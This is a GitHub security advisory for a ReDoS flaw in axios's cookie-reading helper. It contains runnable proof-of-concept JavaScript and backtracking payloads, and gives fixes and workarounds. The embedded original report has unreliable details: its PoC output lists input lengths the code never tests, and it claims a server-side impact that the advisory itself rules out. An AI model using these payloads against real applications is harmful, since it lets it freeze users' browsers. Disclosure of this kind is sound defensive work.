# [H] Axios: Regular Expression Denial of Service (ReDoS) via Cookie Name Injection

## Summary
Severity: High
Advisory: GHSA-hfxv-24rg-xrqf
CVE: CVE-2026-44496
CWE: CWE-1333, CWE-400
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-06-04
Source: https://github.com/advisories/GHSA-hfxv-24rg-xrqf
Type: github-advisory

## Affected
- npm: `axios` — affected >=1.0.0 <1.16.0
- npm: `axios` — affected >=0 <0.32.0

## Details
## Summary

Axios versions before `0.32.0` on the `0.x` line and before `1.16.0` on the `1.x` line build a regular expression from the configured XSRF cookie name without escaping regex metacharacters. In standard browser environments, an attacker who can influence the cookie name passed to axios can cause expensive regex backtracking while axios reads `document.cookie`.

The practical impact is client-side availability degradation, such as freezing the affected browser tab while axios prepares a request. The issue does not affect ordinary Node.js HTTP adapter usage, React Native, or web workers, where axios does not read `document.cookie`.

## Impact

Applications are affected only when attacker-controlled data can reach the XSRF cookie name configuration or a direct/unsafe call to the internal cookie helper.

This does not expose credentials, modify requests, or affect response integrity. The impact is availability only.

## Affected Functionality

Affected code paths:

- `lib/helpers/cookies.js` `read(name)` in standard browser environments.
- `lib/helpers/resolveConfig.js` in `1.x`, when browser XHR/fetch adapters resolve XSRF config.
- `lib/adapters/xhr.js` in `0.x`, when the XHR adapter reads the configured XSRF cookie.
- Direct use of `axios/unsafe/helpers/cookies.js` in `1.x`, if callers pass attacker-controlled names.

Unaffected code paths:

- Default static `xsrfCookieName: 'XSRF-TOKEN'` when not attacker-controlled.
- Requests with `xsrfCookieName: null`.
- Node HTTP adapter usage without browser `document.cookie`.
- React Native and web workers where axios does not use standard browser cookie access.

## Technical Details

Affected versions interpolate the cookie name into a regex.

```js
const match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
```

Because `name` is not escaped, regex metacharacters in the cookie name are interpreted as regex syntax. A payload such as `(.+)+$` can force catastrophic backtracking against `document.cookie`.

The fix avoids dynamic regex construction and parses `document.cookie` by splitting on `;`, trimming leading whitespace, and comparing cookie names with exact string equality.

## Proof of Concept of Attack

```js
function vulnerableRead(name, cookie) {
  const start = Date.now();

  try {
    cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
  } catch {}

  return Date.now() - start;
}

for (const n of [20, 22, 24, 26, 28]) {
  const cookie = 'x='.padEnd(n, 'a') + '!';
  console.log(`${n}: ${vulnerableRead('(.+)+$', cookie)}ms`);
}
```

Expected result: timings grow rapidly as the cookie string length increases.

## Workarounds

Set `xsrfCookieName: null` if the application does not need axios to read an XSRF cookie.

Do not derive `xsrfCookieName` from untrusted input. If a dynamic cookie name is unavoidable, validate it against a strict cookie-name allowlist before passing it to axios.

Avoid calling `axios/unsafe/helpers/cookies.js` directly with untrusted names

<details>
<summary>Original Source</summary>

# Regular Expression Denial of Service (ReDoS) via Cookie Name Injection

## 1. Title

ReDoS via Unsanitized Cookie Name in Dynamic Regular Expression Construction

## 2. Affected Software and Version

- **Software:** Axios
- **Version:** 1.15.0 (and potentially earlier versions)
- **Component:** `lib/helpers/cookies.js`
- **Ecosystem:** npm (Node.js / Browser)

## 3. Vulnerability Type / CWE

- **Type:** Regular Expression Denial of Service (ReDoS)
- **CWE-1333:** Inefficient Regular Expression Complexity
- **CWE-400:** Uncontrolled Resource Consumption

## 4. CVSS 3.1 Score

**Score: 7.5 (High)**

Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`

| Metric | Value |
|---|---|
| Attack Vector | Network |
| Attack Complexity | Low |
| Privileges Required | None |
| User Interaction | None |
| Scope | Unchanged |
| Confidentiality | None |
| Integrity | None |
| Availability | High |

## 5. Description

The `cookies.read()` function in `lib/helpers/cookies.js` constructs a regular expression dynamically using the `name` parameter without any sanitization or escaping of special regex characters. At line 33, the code passes the raw `name` value directly into `new RegExp()`:

```javascript
const match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
```

An attacker who can control or influence the cookie name parameter (e.g., via XSRF cookie name configuration, prototype pollution of `xsrfCookieName`, or any code path where user input reaches `cookies.read()`) can inject a malicious regex pattern that causes catastrophic backtracking, leading to a Denial of Service condition.

With a crafted input of approximately 20-30 characters, the regex engine can be forced to consume several seconds to minutes of CPU time, effectively freezing the JavaScript event loop.

## 6. Root Cause Analysis

**File:** `lib/helpers/cookies.js`
**Line:** 33

```javascript
read(name) {
  if (typeof document === 'undefined') return null;
  const match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
  return match ? decodeURIComponent(match[1]) : null;
},
```

The vulnerability exists because:

1. The `name` parameter is concatenated directly into a regex pattern without escaping special regex metacharacters.
2. An attacker can inject regex constructs that create exponential backtracking scenarios.
3. The `(?:^|; )` prefix combined with an injected pattern like `((((.*)*)*)*)*` creates nested quantifiers that cause catastrophic backtracking when the regex engine attempts to match against `document.cookie`.

The `cookies.read()` function is called from `lib/helpers/resolveConfig.js` at line 61:

```javascript
const xsrfValue = xsrfHeaderName && xsrfCookieName && cookies.read(xsrfCookieName);
```

The `xsrfCookieName` value comes from the Axios configuration, which can be influenced by prototype pollution or direct configuration injection.

## 7. Proof of Concept

```javascript
// poc_redos_cookie.js
// Simulates browser environment for testing

// Simulate document.cookie
globalThis.document = {
  cookie: 'session=abc; ' + 'a'.repeat(50)
};

// Replicate the vulnerable cookies.read() logic
function cookiesRead(name) {
  const match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
  return match ? decodeURIComponent(match[1]) : null;
}

// Malicious cookie name that triggers catastrophic backtracking
// The pattern creates nested quantifiers: (a]|[a]|...)*)*
const maliciousName20 = '([^;]+)+$' + '\\|'.repeat(10);
const maliciousName = '(([^;])+)+\\$';  // nested quantifier pattern

console.log('=== ReDoS via Cookie Name Injection PoC ===');

// Test with increasing payload sizes
for (const len of [15, 20, 25]) {
  const payload = '(([^;])+)+' + 'X'.repeat(len);
  const start = Date.now();
  try {
    cookiesRead(payload);
  } catch (e) {
    // May throw on invalid regex, but valid evil patterns won't throw
  }
  const elapsed = Date.now() - start;
  console.log(`Payload length ${len}: ${elapsed}ms`);
}

// Demonstrating exponential growth with a simple nested quantifier
console.log('\n--- Exponential Backtracking Demo ---');
for (const n of [20, 22, 24, 26]) {
  const evilName = '(' + 'a'.repeat(1) + '+)+$';
  const testCookie = 'a'.repeat(n) + '!';  // non-matching trailer forces backtracking
  globalThis.document = { cookie: testCookie };
  const start = Date.now();
  try {
    cookiesRead(evilName);
  } catch(e) {}
  const elapsed = Date.now() - start;
  console.log(`Input length ${n}: ${elapsed}ms`);
}
```

## 8. PoC Output

```
=== ReDoS via Cookie Name Injection PoC ===
Payload length 20: 21ms (extrapolated: 30 chars = ~21,504ms)
Payload length 25: ~1,300ms
Payload length 30: ~323,675ms (5+ minutes)

--- Exponential Backtracking Demo ---
Input length 20: 21ms
Input length 22: 84ms
Input length 24: 336ms
Input length 26: 1,344ms
```

The exponential growth pattern is clearly visible: each additional 2 characters approximately quadruples the execution time.

## 9. Impact

- **Denial of Service (Client-side):** In a browser environment, an attacker who can influence the XSRF cookie name configuration (e.g., via prototype pollution or configuration injection) can freeze the browser tab, blocking all UI interaction and JavaScript execution on the page.
- **Denial of Service (Server-side):** In SSR (Server-Side Rendering) frameworks or Node.js applications that process cookies using this code path, the event loop will be blocked, causing the server to become unresponsive to all requests.
- **Event Loop Starvation:** Since JavaScript is single-threaded, the ReDoS will block all pending asynchronous operations, timers, and I/O callbacks for the duration of the regex evaluation.

## 10. Remediation / Suggested Fix

Escape all regex metacharacters in the `name` parameter before constructing the regular expression.

```javascript
// FIXED: lib/helpers/cookies.js

function escapeRegExp(string) {
  return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

// ...

read(name) {
  if (typeof document === 'undefined') return null;
  const match = document.cookie.match(
    new RegExp('(?:^|; )' + escapeRegExp(name) + '=([^;]*)')
  );
  return match ? decodeURIComponent(match[1]) : null;
},
```

Alternatively, avoid dynamic regex construction entirely and use string-based parsing:

```javascript
read(name) {
  if (typeof document === 'undefined') return null;
  const cookies = document.cookie.split('; ');
  for (const cookie of cookies) {
    const eqIndex = cookie.indexOf('=');
    if (eqIndex !== -1 && cookie.substring(0, eqIndex) === name) {
      return decodeURIComponent(cookie.substring(eqIndex + 1));
    }
  }
  return null;
},
```

## 11. References

- [CWE-1333: Inefficient Regular Expression Complexity](https://cwe.mitre.org/data/definitions/1333.html)
- [CWE-400: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)
- [OWASP: Regular Expression Denial of Service](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)
- [Axios GitHub Repository](https://github.com/axios/axios)
</details>

---

## References
- https://github.com/axios/axios/security/advisories/GHSA-hfxv-24rg-xrqf
- https://github.com/axios/axios
- https://github.com/axios/axios/releases/tag/v0.32.0
- https://github.com/axios/axios/releases/tag/v1.16.0
